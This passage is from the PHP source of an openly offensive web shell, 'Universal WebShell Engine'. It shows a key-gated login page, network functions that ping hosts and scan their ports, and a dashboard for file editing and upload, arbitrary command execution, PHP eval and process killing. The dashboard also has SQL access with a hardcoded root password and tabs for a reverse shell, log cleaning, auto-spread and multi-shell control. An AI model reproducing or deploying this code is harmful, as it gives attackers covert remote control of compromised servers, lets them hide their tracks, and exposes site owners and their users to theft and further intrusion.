                while ($col = $colres->fetch_assoc()) { $t = $col['TABLE_NAME']; $c = $col['COLUMN_NAME']; $qr = $conn->query("SELECT COUNT(*) AS c FROM `$t` WHERE `$c` LIKE '%$ss%'"); if ($qr && $r=$qr->fetch_assoc() && $r['c']>0) $results[] = ['table'=>$t,'column'=>$c,'count'=>$r['c']]; }
                json_exit(['ok'=>true,'results'=>$results,'search'=>$search,'db'=>$dbName]);
            }
            json_exit(['error'=>'Unknown action']);
        } catch (Exception $e) { json_exit(['error'=>$e->getMessage()]); }
    }

    /* ── LEGACY: Network ── */
    if ($mode === 'network') {
        $action = $_REQUEST['action'] ?? 'ping'; $host = $_REQUEST['host'] ?? '127.0.0.1';
        $ports = $_REQUEST['ports'] ?? '22,80,443,3306,8080'; $url = $_REQUEST['url'] ?? 'http://example.com';
        $timeout = max(1, min(30, intval($_REQUEST['timeout'] ?? 5)));
        if ($action === 'ping') { ob_start(); if ($IS_WIN) system("ping -n 2 -w {$timeout}000 " . escapeshellarg($host) . " 2>&1", $rc); else system("ping -c 2 -W $timeout " . escapeshellarg($host) . " 2>&1", $rc); json_exit(['ok'=>true,'output'=>ob_get_clean()]); }
        if ($action === 'dns') { ob_start(); if ($IS_WIN) system("nslookup " . escapeshellarg($host) . " 2>&1", $rc); else system("host " . escapeshellarg($host) . " 2>&1 || nslookup " . escapeshellarg($host) . " 2>&1", $rc); json_exit(['ok'=>true,'output'=>ob_get_clean()]); }
        if ($action === 'portscan') { $plist = explode(',', $ports); $results = []; foreach ($plist as $pt) { $pt = trim($pt); $sock = @fsockopen($host, intval($pt), $eno, $err, $timeout); $results[] = ['port'=>intval($pt),'open'=>$sock!==false]; if ($sock) fclose($sock); } json_exit(['ok'=>true,'results'=>$results,'host'=>$host]); }
        if ($action === 'portscan_range') { $start = max(1, intval($_REQUEST['start'] ?? 1)); $end = min(65535, intval($_REQUEST['end'] ?? 1024)); $open = []; for ($p = $start; $p <= $end; $p++) { $sock = @fsockopen($host, $p, $eno, $err, 0.5); if ($sock) { fclose($sock); $open[] = $p; } } json_exit(['ok'=>true,'open_ports'=>$open,'count'=>count($open),'range'=>"$start-$end",'host'=>$host]); }
        if ($action === 'http') { $ctx = stream_context_create(['http'=>['timeout'=>$timeout,'method'=>'GET','header'=>"User-Agent: Mozilla/5.0\r\n"]]); $body = @file_get_contents($url, false, $ctx); $headers = $http_response_header ?? []; json_exit(['ok'=>true,'body'=>strlen($body ?? '').' bytes','headers'=>$headers,'status'=>implode("\n",$headers)]); }
        if ($action === 'whois') { ob_start(); system("whois " . escapeshellarg($host) . " 2>&1 | head -100", $rc); json_exit(['ok'=>true,'output'=>ob_get_clean()]); }
        json_exit(['error'=>'Unknown action']);
    }

    json_exit(['error'=>'Unknown mode']);
}

/* ════════════════════════════════════════════════════════
   AUTH
   ════════════════════════════════════════════════════════ */
if ($mode !== 'login' && $mode !== 'ping' && $mode !== 'css' && !is_auth()) {
    if ($mode !== '') { header('HTTP/1.0 403 Forbidden'); exit; }
    $mode = 'login';
}

if ($mode === 'login') {
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title><?= $APP ?></title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0f;display:flex;align-items:center;justify-content:center;min-height:100vh;color:#e0e0e0}
.login-box{background:#12121a;border-radius:16px;padding:40px;width:380px;box-shadow:0 20px 60px rgba(0,0,0,.5);border:1px solid #1e1e2e;text-align:center}
.logo{font-size:36px;margin-bottom:16px;filter:drop-shadow(0 0 20px rgba(239,68,68,.4))}
h1{font-size:22px;color:#fff;font-weight:700;margin-bottom:4px}
.sub{font-size:13px;color:#666;margin-bottom:28px}
input{width:100%;padding:12px 14px;border:1px solid #2a2a3a;border-radius:8px;background:#0d0d15;color:#e0e0e0;font-size:14px;outline:none;margin-bottom:12px}
input:focus{border-color:#ef4444;box-shadow:0 0 0 3px rgba(239,68,68,.15)}
button{width:100%;padding:12px;border:none;border-radius:8px;background:linear-gradient(135deg,#ef4444,#dc2626);color:#fff;font-size:14px;font-weight:600;cursor:pointer}
button:hover{box-shadow:0 8px 25px rgba(239,68,68,.3)}
.error{background:#2a1010;border:1px solid #5c1a1a;color:#ef4444;padding:10px;border-radius:8px;font-size:13px;margin-bottom:15px;display:none}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">🦊</div>
<h1><?= $APP ?></h1>
<p class="sub">Universal WebShell Engine <?= $VERSION ?></p>
<div class="error" id="loginError"></div>
<form id="loginForm" onsubmit="return doLogin()">
<input type="password" id="loginKey" placeholder="Access Key" autofocus>
<button type="submit">ACCESS PANEL</button>
</form>
</div>
<script>
function doLogin(){var k=document.getElementById('loginKey').value;if(!k)return false;window.location.href='?k='+encodeURIComponent(k);return false;}
document.getElementById('loginKey').addEventListener('keydown',function(e){if(e.key==='Enter')doLogin();});
</script>
</body>
</html>
<?php exit; }

if (!is_auth()) { header('Location: ?e=1'); exit; }

/* ════════════════════════════════════════════════════════
   DASHBOARD HTML
   ════════════════════════════════════════════════════════ */
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title><?= $APP ?> <?= $VERSION ?> — <?= htmlspecialchars($HOSTNAME) ?></title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<style>
:root{--red:#ef4444;--bg:#0a0a0f;--card:#12121a;--border:#1e1e2e;--text:#ccc;--muted:#555;--green:#22c55e;--blue:#60a5fa;--purple:#a78bfa;--yellow:#fbbf24}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:var(--bg);color:var(--text);display:flex;height:100vh;overflow:hidden;font-size:13px}
::-webkit-scrollbar{width:5px;height:5px}
::-webkit-scrollbar-track{background:#12121a}
::-webkit-scrollbar-thumb{background:#2a2a3a;border-radius:4px}

/* ─── Sidebar ─── */
.sidebar{width:200px;background:#0f0f17;border-right:1px solid #1a1a2a;display:flex;flex-direction:column;flex-shrink:0}
.sidebar .brand{padding:16px;border-bottom:1px solid #1a1a2a;font-size:14px;font-weight:700;color:#fff;display:flex;align-items:center;gap:8px}
.sidebar .brand .badge{background:var(--red);font-size:9px;padding:2px 6px;border-radius:3px;font-weight:600}
.sidebar .nav{flex:1;overflow-y:auto;padding:6px}
.nav-item{display:flex;align-items:center;gap:8px;padding:8px 10px;border-radius:6px;cursor:pointer;color:#666;font-size:12px;margin-bottom:1px;transition:.1s}
.nav-item:hover{background:#16161f;color:#aaa}
.nav-item.active{background:var(--red);color:#fff}
.nav-item i{width:16px;text-align:center;font-size:13px}
.sidebar .footer{padding:10px 14px;border-top:1px solid #1a1a2a;font-size:10px;color:#444}

/* ─── Main ─── */
.main{flex:1;display:flex;flex-direction:column;overflow:hidden}
.toolbar{display:flex;align-items:center;gap:8px;padding:10px 16px;background:#0f0f17;border-bottom:1px solid #1a1a2a;flex-shrink:0}
.toolbar .path{flex:1;background:#12121a;border:1px solid var(--border);border-radius:5px;padding:6px 10px;font-size:12px;color:var(--text);font-family:monospace;outline:none}
.toolbar .path:focus{border-color:var(--red)}
.tb-btn{background:#16161f;border:1px solid var(--border);border-radius:5px;color:#aaa;padding:6px 10px;cursor:pointer;font-size:12px;transition:.1s}
.tb-btn:hover{background:#1e1e2e;color:#fff}
.tb-btn.primary{background:var(--red);border-color:var(--red);color:#fff}
.tb-btn.primary:hover{background:#dc2626}
.tb-btn.green{background:#16a34a;border-color:#16a34a;color:#fff}
.tb-btn.green:hover{background:#15803d}

.content{flex:1;overflow:auto;padding:16px}

/* ─── File Table ─── */
.ft{width:100%;border-collapse:collapse}
.ft th{text-align:left;padding:8px 10px;font-size:10px;text-transform:uppercase;color:var(--muted);font-weight:600;border-bottom:1px solid #1a1a2a}
.ft td{padding:6px 10px;border-bottom:1px solid #12121a;font-size:12px}
.ft tr:hover td{background:#12121a}
.ft .icon{width:26px;text-align:center}
.ft .nm{color:#e0e0e0}
.ft .sz{color:var(--muted);width:70px}
.ft .tm{color:var(--muted);width:120px}
.ft .prm{color:#444;width:50px;font-family:monospace;font-size:10px}
.ft .act{width:90px;text-align:right}
.ft .act button{background:0;border:none;color:var(--muted);cursor:pointer;padding:3px 5px;border-radius:3px;font-size:11px}
.ft .act button:hover{color:#fff;background:#1e1e2e}
.ft .up-row{color:#888;cursor:pointer}
.ft .up-row:hover td{color:#fff}

/* ─── Card Grid ─── */
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:8px;align-content:start}
.card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:14px}
.card h3{font-size:13px;color:#fff;margin-bottom:8px;display:flex;align-items:center;gap:6px}
.card pre{background:#08080d;border-radius:5px;padding:10px;font-size:11px;color:var(--text);overflow:auto;max-height:200px;white-space:pre-wrap;word-break:break-all}

/* ─── Forms ─── */
input,select,textarea{background:#0d0d15;border:1px solid var(--border);border-radius:5px;color:var(--text);padding:7px 10px;font-size:12px;outline:none}
input:focus,select:focus,textarea:focus{border-color:var(--red)}
textarea{font-family:monospace;resize:vertical}

/* ─── Buttons ─── */
.btn{background:#16161f;border:1px solid var(--border);border-radius:5px;color:#aaa;padding:7px 14px;cursor:pointer;font-size:12px}
.btn:hover{background:#1e1e2e;color:#fff}
.btn-danger{background:#991b1b;border-color:#991b1b;color:#fff}
.btn-danger:hover{background:#7f1d1d}
.btn-primary{background:var(--red);border-color:var(--red);color:#fff}
.btn-primary:hover{background:#dc2626}
.btn-success{background:#16a34a;border-color:#16a34a;color:#fff}
.btn-success:hover{background:#15803d}
.btn-warning{background:#d97706;border-color:#d97706;color:#fff}

/* ─── Result Table ─── */
.rt{width:100%;border-collapse:collapse;font-size:11px}
.rt th{text-align:left;padding:6px 8px;background:#0f0f17;border-bottom:2px solid var(--border);color:#888;font-weight:600;white-space:nowrap}
.rt td{padding:5px 8px;border-bottom:1px solid #12121a;max-width:250px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.rt tr:hover td{background:#12121a}

/* ─── Modal ─── */
.modal-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.8);z-index:100;align-items:center;justify-content:center}
.modal-overlay.show{display:flex}
.modal{background:var(--card);border:1px solid var(--border);border-radius:12px;width:750px;max-width:92vw;max-height:85vh;display:flex;flex-direction:column}
.modal-header{padding:14px 18px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between}
.modal-header h3{font-size:13px;color:#fff;font-weight:600}
.modal-header .close{background:0;border:none;color:var(--muted);font-size:22px;cursor:pointer}
.modal-header .close:hover{color:#fff}
.modal-body{padding:16px;overflow:auto;flex:1}
.modal-body pre{background:#08080d;border-radius:5px;padding:12px;font-size:11px;overflow:auto;max-height:55vh;color:var(--text);white-space:pre-wrap;word-break:break-all}

/* ─── Status Bar ─── */
.status-bar{display:flex;gap:16px;padding:8px 16px;background:#0f0f17;border-top:1px solid #1a1a2a;font-size:10px;color:#444;flex-shrink:0}
.status-bar .dot{width:5px;height:5px;border-radius:50%;display:inline-block;margin-right:4px}
.dot.green{background:var(--green)}

/* ─── Utilities ─── */
.toast{position:fixed;bottom:16px;right:16px;background:var(--card);border:1px solid var(--border);border-radius:8px;padding:10px 16px;font-size:12px;color:var(--text);display:none;z-index:200;box-shadow:0 10px 30px rgba(0,0,0,.5)}
.empty-state{text-align:center;padding:50px 20px;color:#444}
.empty-state i{font-size:36px;margin-bottom:12px}
.loading{text-align:center;padding:40px;color:var(--muted)}
.loading i{animation:spin 1s linear infinite}
@keyframes spin{100%{transform:rotate(360deg)}}
.flex{display:flex;gap:8px;align-items:center}
.flex-wrap{flex-wrap:wrap}
.gap-4{gap:4px}.mb-8{margin-bottom:8px}.mt-8{margin-top:8px}
.w-full{width:100%}.flex-1{flex:1}
.text-muted{color:var(--muted);font-size:11px}
.text-green{color:var(--green)}.text-red{color:var(--red)}.text-blue{color:var(--blue)}.text-purple{color:var(--purple)}
.font-mono{font-family:monospace}

/* ─── Hub ─── */
.hub-item{display:flex;align-items:center;gap:10px;padding:8px 12px;background:#0d0d15;border:1px solid var(--border);border-radius:6px;margin-bottom:4px}
.hub-item .dot{width:8px;height:8px;border-radius:50%;background:var(--muted);flex-shrink:0}
.hub-item .dot.alive{background:var(--green)}
.hub-item .dot.dead{background:var(--muted)}

/* ─── Process ─── */
.proc-table{font-size:11px;width:100%}
.proc-table th{text-align:left;padding:4px 6px;background:#0f0f17;border-bottom:1px solid var(--border);color:#888}
.proc-table td{padding:3px 6px;border-bottom:1px solid #111;font-family:monospace;font-size:10px}

/* ─── Rev Shell ─── */
.rev-item{cursor:pointer;transition:.1s}
.rev-item:hover{border-color:var(--green)}

/* ─── Term Output ─── */
.term-out{color:#0f0;white-space:pre-wrap;word-break:break-all}

/* ─── Responsive ─── */
@media(max-width:768px){
.sidebar{width:48px}
.sidebar .brand span,.sidebar .brand .badge,.nav-item span{display:none}
.sidebar .footer{display:none}
.grid{grid-template-columns:1fr}
}
</style>
</head>
<body>

<!-- Sidebar -->
<div class="sidebar">
<div class="brand"><span>🦊</span><span><?= $APP ?> <span class="badge"><?= $VERSION ?></span></span></div>
<div class="nav">
<div class="nav-item active" onclick="switchTab('files')" data-tab="files"><i class="fas fa-folder"></i><span>Files</span></div>
<div class="nav-item" onclick="switchTab('cmd')" data-tab="cmd"><i class="fas fa-terminal"></i><span>Command</span></div>
<div class="nav-item" onclick="switchTab('ps')" data-tab="ps"><i class="fas fa-microchip"></i><span>Processes</span></div>
<div class="nav-item" onclick="switchTab('sql')" data-tab="sql"><i class="fas fa-database"></i><span>SQL</span></div>
<div class="nav-item" onclick="switchTab('users')" data-tab="users"><i class="fas fa-users"></i><span>Users</span></div>
<div class="nav-item" onclick="switchTab('wp')" data-tab="wp"><i class="fab fa-wordpress"></i><span>WP Manager</span></div>
<div class="nav-item" onclick="switchTab('network')" data-tab="network"><i class="fas fa-network-wired"></i><span>Network</span></div>
<div class="nav-item" onclick="switchTab('revshell')" data-tab="revshell"><i class="fas fa-skull"></i><span>Rev Shell</span></div>
<div class="nav-item" onclick="switchTab('search')" data-tab="search"><i class="fas fa-search"></i><span>File Search</span></div>
<div class="nav-item" onclick="switchTab('logs')" data-tab="logs"><i class="fas fa-broom"></i><span>Log Cleaner</span></div>
<div class="nav-item" onclick="switchTab('cron')" data-tab="cron"><i class="fas fa-clock"></i><span>Cron</span></div>
<div class="nav-item" onclick="switchTab('spread')" data-tab="spread"><i class="fas fa-bolt"></i><span>Auto-Spread</span></div>
<div class="nav-item" onclick="switchTab('hub')" data-tab="hub"><i class="fas fa-globe"></i><span>Multi-Shell</span></div>
<div class="nav-item" onclick="switchTab('bench')" data-tab="bench"><i class="fas fa-tachometer-alt"></i><span>Benchmark</span></div>
<div class="nav-item" onclick="switchTab('eval')" data-tab="eval"><i class="fas fa-code"></i><span>PHP Eval</span></div>
<div class="nav-item" onclick="switchTab('info')" data-tab="info"><i class="fas fa-info-circle"></i><span>PHP Info</span></div>
</div>
<div class="footer"><?= $HOSTNAME ?> | <?= $USER ?> | <?= $OS ?></div>
</div>

<!-- Main -->
<div class="main">
<div class="toolbar" id="fileToolbar">
<i class="fas fa-folder-open" style="color:var(--red)"></i>
<input class="path" id="currentPath" value="<?= htmlspecialchars($ROOT_DIR) ?>" readonly>
<button class="tb-btn" onclick="goUp()"><i class="fas fa-arrow-up"></i></button>
<button class="tb-btn" onclick="goHome()"><i class="fas fa-home"></i></button>
<button class="tb-btn" onclick="refresh()"><i class="fas fa-sync-alt"></i></button>
<button class="tb-btn primary" onclick="newFolder()"><i class="fas fa-folder-plus"></i> New</button>
<button class="tb-btn green" onclick="showUpload()"><i class="fas fa-upload"></i> Upload</button>
<button class="tb-btn" onclick="downloadShell()" style="background:#7c3aed;border-color:#7c3aed;color:#fff"><i class="fas fa-download"></i> Shell</button>
</div>

<div class="content" id="mainContent">
<div id="loader" class="loading" style="display:none"><i class="fas fa-spinner"></i><br><br>Loading...</div>
<div id="fileContent"></div>
</div>

<div class="status-bar">
<span><span class="dot green"></span> Live</span>
<span id="fileCount"></span>
<span id="serverInfo"></span>
<span style="margin-left:auto"><?= $OS ?> | PHP <?= phpversion() ?></span>
</div>
</div>

<!-- Modal -->
<div class="modal-overlay" id="modal">
<div class="modal">
<div class="modal-header"><h3 id="modalTitle">File</h3><button class="close" onclick="closeModal()">&times;</button></div>
<div class="modal-body" id="modalBody"></div>
</div>
</div>

<!-- Toast -->
<div class="toast" id="toast"></div>

<script>
var KEY = '<?= $SECRET ?>';
var BASE = window.location.pathname;
var ROOT = '<?= $ROOT_DIR ?>';
var CUR_PATH = ROOT;
var CUR_TAB = 'files';
var IS_WIN = <?= $IS_WIN ? 'true' : 'false' ?>;

/* ─── HELPERS ─── */
function $(id) { return document.getElementById(id); }
function esc(s) { return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
function pad(n) { return n<10?'0'+n:n; }

function showToast(msg) {
    var t = $('toast'); t.textContent = msg; t.style.display = 'block';
    setTimeout(function(){ t.style.display='none'; }, 3000);
}

function openModal(title, h) {
    $('modalTitle').textContent = title; $('modalBody').innerHTML = h;
    $('modal').classList.add('show');
}
function closeModal() { $('modal').classList.remove('show'); }
$('modal').addEventListener('click', function(e) { if (e.target === this) closeModal(); });

function humanSize(b) {
    if (b>1073741824) return (b/1073741824).toFixed(1)+' GB';
    if (b>1048576) return (b/1048576).toFixed(1)+' MB';
    if (b>1024) return (b/1024).toFixed(1)+' KB';
    return b+' B';
}

/* ─── API ─── */
function api(m, data, cb) {
    var xhr = new XMLHttpRequest();
    var params = 'ajax=1&m=' + m + '&k=' + KEY;
    if (data) { for (var k in data) params += '&' + encodeURIComponent(k) + '=' + encodeURIComponent(data[k]); }
    xhr.open('GET', BASE + '?' + params, true);
    xhr.onload = function() { try { cb(JSON.parse(xhr.responseText)); } catch(e) { cb({error: xhr.responseText}); } };
    xhr.onerror = function() { cb({error:'Request failed'}); };
    xhr.send();
}

function apiPost(m, fd, cb) {
    var xhr = new XMLHttpRequest();
    fd.append('ajax','1'); fd.append('m',m); fd.append('k',KEY);
    xhr.open('POST', BASE, true);
    xhr.onload = function() { try { cb(JSON.parse(xhr.responseText)); } catch(e) { cb({error:xhr.responseText}); } };
    xhr.send(fd);
}

/* ─── TAB SYSTEM ─── */
function switchTab(tab) {
    CUR_TAB = tab;
    document.querySelectorAll('.nav-item').forEach(function(n){ n.classList.remove('active'); });
    var sel = document.querySelector('.nav-item[data-tab="'+tab+'"]');
    if (sel) sel.classList.add('active');
    var c = $('fileContent');
    $('fileToolbar').style.display = (tab==='files') ? 'flex' : 'none';
    $('loader').style.display = 'none';
    switch(tab) {
        case 'files': loadDir(CUR_PATH); break;
        case 'cmd': renderCmd(); break;
        case 'ps': renderPS(); break;
        case 'sql': renderSQL(); break;
        case 'users': loadUsers(); break;
        case 'wp': renderWP(); break;
        case 'network': renderNet(); break;
        case 'revshell': renderRev(); break;
        case 'search': renderSearch(); break;
        case 'logs': renderLogs(); break;
        case 'cron': renderCron(); break;
        case 'spread': renderSpread(); break;
        case 'hub': renderHub(); break;
        case 'bench': renderBench(); break;
        case 'eval': c.innerHTML = '<textarea style="width:100%;min-height:120px;background:#08080d;border:1px solid var(--border);border-radius:5px;color:var(--text);font-family:monospace;font-size:12px;padding:12px" id="evalCode">phpinfo();</textarea><button class="btn btn-primary mt-8" onclick="doEval()"><i class="fas fa-play"></i> Execute</button><pre id="evalOut" class="mt-8" style="background:#08080d;border-radius:5px;padding:12px;font-size:11px;overflow:auto"></pre>'; break;
        case 'info': c.innerHTML = '<div id="phpInfoContent" class="loading"><i class="fas fa-spinner"></i><br>Loading...</div>'; api('phpinfo',{},function(r){if(r.html)$('phpInfoContent').innerHTML=r.html;}); break;
    }
}

function doEval() { api('eval',{code:$('evalCode').value},function(r){$('evalOut').textContent=r.output||'(no output)';}); }

/* ════════════════════════════════════════════════════════
   FILE MANAGER
   ════════════════════════════════════════════════════════ */
function loadDir(path) {
    showLoader();
    CUR_PATH = path; $('currentPath').value = path;
    api('ls', {p:path}, function(res) {
        hideLoader();
        if (res.error) { $('fileContent').innerHTML = '<div class="empty-state"><i class="fas fa-exclamation-triangle"></i><br>'+esc(res.error)+'</div>'; return; }
        $('currentPath').value = res.path;
        $('fileCount').textContent = res.items.length + ' items';
        CUR_PATH = res.path;
        var h = '<table class="ft"><tr><th></th><th>Name</th><th>Size</th><th>Modified</th><th>Perm</th><th></th></tr>';
        if (res.path !== '/') h += '<tr class="up-row" onclick="goUp()"><td class="icon"><i class="fas fa-level-up-alt"></i></td><td colspan="5">..</td></tr>';
        for (var i=0;i<res.items.length;i++) {
            var it=res.items[i], icon, color='#666';
            if (it.type==='dir') { icon='fa-folder'; color='var(--purple)'; }
            else { var e=it.ext.toLowerCase();
                if(['jpg','jpeg','png','gif','webp','ico','svg'].indexOf(e)>=0){icon='fa-file-image';color='var(--yellow)';}
                else if(['php','phtml','php3','php4','php5','php7','pht'].indexOf(e)>=0){icon='fa-file-code';color='var(--blue)';}
                else if(['zip','tar','gz','rar','7z'].indexOf(e)>=0){icon='fa-file-archive';color='#fb923c';}
                else if(['sql','db'].indexOf(e)>=0){icon='fa-file-database';color='var(--green)';}
                else if(['html','htm','js','css','json','xml','md','txt','log'].indexOf(e)>=0){icon='fa-file-alt';color='#94a3b8';}
                else {icon='fa-file';color='#666';} }
            var d=new Date(it.time*1000), tm=d.getFullYear()+'-'+pad(d.getMonth()+1)+'-'+pad(d.getDate())+' '+pad(d.getHours())+':'+pad(d.getMinutes());
            var fp=CUR_PATH+'/'+it.name, acts='';
            if(it.type==='file') {
                acts+='<button onclick="event.stopPropagation();viewFile(\''+fp+'\')" title="View"><i class="fas fa-eye"></i></button>';
                acts+='<button onclick="event.stopPropagation();deleteFile(\''+fp+'\')" title="Delete"><i class="fas fa-trash"></i></button>';
                acts+='<button onclick="event.stopPropagation();downloadFile(\''+fp+'\')" title="Download"><i class="fas fa-download"></i></button>';
            } else {
                acts+='<button onclick="event.stopPropagation();deleteFile(\''+fp+'\')" title="Delete"><i class="fas fa-trash"></i></button>';
            }
            h += '<tr'+(it.type==='dir'?' onclick="loadDir(\''+fp+'\')" style="cursor:pointer"':'')+'>'+
                '<td class="icon"><i class="fas '+icon+'" style="color:'+color+'"></i></td>'+
                '<td class="nm">'+esc(it.name)+'</td>'+
                '<td class="sz">'+(it.type==='file'?humanSize(it.size):'-')+'</td>'+
                '<td class="tm">'+tm+'</td>'+
                '<td class="prm">'+it.perm+'</td>'+
                '<td class="act">'+acts+'</td></tr>';
        }
        h += '</table>';
        $('fileContent').innerHTML = h;
    });
}

function showLoader(){ $('loader').style.display='block'; $('fileContent').innerHTML=''; }
function hideLoader(){ $('loader').style.display='none'; }

function goUp() {
    var p = CUR_PATH.replace(/\\/g,'/').replace(/\/$/,'');
    var up = p.substring(0, p.lastIndexOf('/'));
    if (up === '') up = '/';
    loadDir(up);
}
function goHome() { loadDir(ROOT); }
function refresh() { loadDir(CUR_PATH); }

function viewFile(path) {
    api('read', {f:path}, function(res) {
        if (res.error) { showToast('Error: '+res.error); return; }
        if (res.type==='image') { openModal(res.name, '<img src="data:image/jpeg;base64,'+res.data+'" style="max-width:100%;border-radius:6px">'); }
        else if (res.type==='text') {
            var h = '<div class="flex mb-8"><button class="btn btn-primary" onclick="saveEdit()">Save</button><span class="text-muted">'+res.content.length+' bytes</span></div>';
            h += '<textarea id="editor" style="width:100%;min-height:300px;background:#08080d;border:1px solid var(--border);border-radius:5px;color:var(--text);font-family:monospace;font-size:12px;padding:12px">'+esc(res.content)+'</textarea>';
            openModal(res.name, h); window._editPath = path; window._editOrig = res.content;
        } else { openModal(res.name, '<div class="empty-state"><i class="fas fa-file"></i><br>Binary file ('+humanSize(res.size)+')</div>'); }
    });
}

window._editPath=''; window._editOrig='';
function saveEdit() {
    var c = $('editor').value.replace(/&amp;/g,'&').replace(/&lt;/g,'<').replace(/&gt;/g,'>');
    api('write', {f:window._editPath, c:c}, function(res) { if(res.ok){showToast('Saved!');closeModal();} else showToast('Error saving'); });
}

function deleteFile(path) { if(!confirm('Delete '+path+'?')) return; api('delete',{f:path},function(r){if(r.ok){refresh();showToast('Deleted');}}); }
function downloadFile(path) { window.open(BASE+'?ajax=1&m=download&k='+KEY+'&f='+encodeURIComponent(path), '_blank'); }
function downloadShell() { downloadFile('<?= __FILE__ ?>'); }

function newFolder() { var n = prompt('Folder name:'); if (!n) return; api('mkdir',{f:CUR_PATH+'/'+n},function(){refresh();showToast('Created');}); }

function showUpload() {
    var inp = document.createElement('input'); inp.type='file';
    inp.onchange=function(){ var fd=new FormData(); fd.append('file',inp.files[0]); fd.append('d',CUR_PATH); apiPost('upload',fd,function(r){if(r.ok){refresh();showToast('Uploaded');}else showToast('Error');}); };
    inp.click();
}

/* ════════════════════════════════════════════════════════
   COMMAND
   ════════════════════════════════════════════════════════ */
var cmdHistory = []; var cmdIdx = -1;

function renderCmd() {
    $('fileContent').innerHTML =
        '<div class="card" style="display:flex;flex-direction:column;height:calc(100vh - 100px)">'+
        '<div style="padding:8px 12px;background:#0f0f17;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px">'+
        '<i class="fas fa-terminal" style="color:var(--red)"></i><span style="font-size:12px;color:#888">'+document.location.hostname+'</span>'+
        '<span id="cmdStatus" style="margin-left:auto;font-size:10px;color:var(--muted)"></span></div>'+
        '<div id="cmdOutput" style="flex:1;padding:12px;font-family:monospace;font-size:12px;color:#0f0;overflow:auto;line-height:1.5;background:#050508"></div>'+
        '<div style="display:flex;border-top:1px solid var(--border);background:#0f0f17">'+
        '<span style="padding:8px 0 8px 12px;color:var(--red);font-family:monospace;font-size:13px">$</span>'+
        '<input id="cmdInput" style="flex:1;background:none;border:none;color:var(--text);font-family:monospace;font-size:13px;padding:8px;outline:none" placeholder="Enter command..." autofocus></div>'+
        '</div>';

    setTimeout(function(){
        api('cmd',{c:IS_WIN?'whoami':'whoami 2>/dev/null'},function(r){if(r.output)$('cmdStatus').textContent='connected: '+r.output.trim();});
    },100);

    var inp = $('cmdInput');
    inp.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            var cmd = this.value; if (!cmd) return;
            cmdHistory.push(cmd); cmdIdx = cmdHistory.length;
            addCmdOut('<span style="color:var(--red)">$ </span>'+esc(cmd)+'\n');
            this.value = '';
            api('cmd',{c:cmd},function(r){addCmdOut((r.output||'')+'\n');});
        }
        if (e.key === 'ArrowUp') { if (cmdIdx > 0) { cmdIdx--; this.value = cmdHistory[cmdIdx]; } e.preventDefault(); }
        if (e.key === 'ArrowDown') { if (cmdIdx < cmdHistory.length-1) { cmdIdx++; this.value = cmdHistory[cmdIdx]; } else { cmdIdx = cmdHistory.length; this.value = ''; } e.preventDefault(); }
    });
}

function addCmdOut(t) { var o=$('cmdOutput'); o.innerHTML+=t; o.scrollTop=o.scrollHeight; }

/* ════════════════════════════════════════════════════════
   PROCESS EXPLORER
   ════════════════════════════════════════════════════════ */
function renderPS() {
    $('fileContent').innerHTML = '<div class="loading"><i class="fas fa-spinner fa-spin"></i><br><br>Loading processes...</div>';
    api('ps', {action:'list'}, function(res) {
        if (res.error) { $('fileContent').innerHTML='<div class="empty-state">'+esc(res.error)+'</div>'; return; }
        var h = '<div class="flex gap-4 mb-8"><span style="color:#fff;font-weight:600">Processes ('+res.count+')</span><span class="text-muted">click PID to kill</span></div>'+
            '<div style="overflow:auto;max-height:calc(100vh - 140px);border:1px solid var(--border);border-radius:6px">';
        if (IS_WIN) {
            h += '<table class="proc-table"><tr><th>PID</th><th>Name</th><th>Mem</th><th>User</th></tr>';
            for (var i=0;i<res.procs.length;i++) { var p=res.procs[i]; h += '<tr><td style="color:var(--red);cursor:pointer" onclick="killProc('+p.pid+')">'+esc(p.pid)+'</td><td>'+esc(p.name)+'</td><td>'+esc(p.mem)+'</td><td>'+esc(p.user)+'</td></tr>'; }
        } else {
            h += '<table class="proc-table"><tr><th>PID</th><th>User</th><th>CPU%</th><th>MEM%</th><th>Command</th></tr>';
            for (var i=0;i<res.procs.length;i++) { var p=res.procs[i]; h += '<tr><td style="color:var(--red);cursor:pointer" onclick="killProc('+p.pid+')">'+esc(p.pid)+'</td><td>'+esc(p.user)+'</td><td>'+esc(p.cpu)+'</td><td>'+esc(p.mem)+'</td><td style="max-width:500px;overflow:hidden;text-overflow:ellipsis">'+esc(p.cmd)+'</td></tr>'; }
        }
        h += '</table></div>';
        $('fileContent').innerHTML = h;
    });
}

function killProc(pid) { if(!confirm('Kill PID '+pid+'?')) return; api('ps',{action:'kill',pid:pid},function(r){if(r.ok){showToast('Killed');renderPS();}}); }

/* ════════════════════════════════════════════════════════
   SQL
   ════════════════════════════════════════════════════════ */
function renderSQL() {
    $('fileContent').innerHTML =
        '<div class="flex flex-wrap gap-4 mb-8">'+
        '<input id="sqlHost" value="127.0.0.1" placeholder="Host" style="width:120px">'+
        '<input id="sqlUser" value="root" placeholder="User" style="width:100px">'+
        '<input id="sqlPass" value="3$T@ku." type="password" style="width:110px">'+
        '<input id="sqlDb" value="webskul" placeholder="Database" style="width:120px">'+
        '</div>'+
        '<textarea id="sqlQuery" style="width:100%;min-height:100px;background:#08080d;border:1px solid var(--border);border-radius:5px;color:var(--text);font-family:monospace;font-size:12px;padding:12px" placeholder="SQL...">SHOW DATABASES</textarea>'+
